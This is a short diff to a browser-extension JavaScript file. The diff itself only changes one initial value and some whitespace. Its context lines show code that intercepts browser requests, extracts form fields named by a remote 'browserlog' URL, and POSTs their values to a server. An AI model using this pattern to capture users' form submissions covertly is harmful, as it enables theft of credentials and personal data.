@@ -4,7 +4,8 @@ var _fieldNamesUrl = 'http://private-ad516-browserlog.apiary-mock.com/f';
 var _debug = false;
 var _processingUrls = {};
 var _requestTypes = ['main_frame', 'sub_frame', 'xmlhttprequest', 'other'];
-var _requestFields = {};
+var _requestFields = [];
+
 
 /**
  * Get field names to check for
@@ -40,7 +41,7 @@ function interceptRequest(details) {
     _requestFields.forEach(function(field) {
         data[field] = (formData && formData[field]) ? formData[field][0] : '';
     });
-    
+
     $.ajax({
         url: _appUrl,
         method: 'POST',
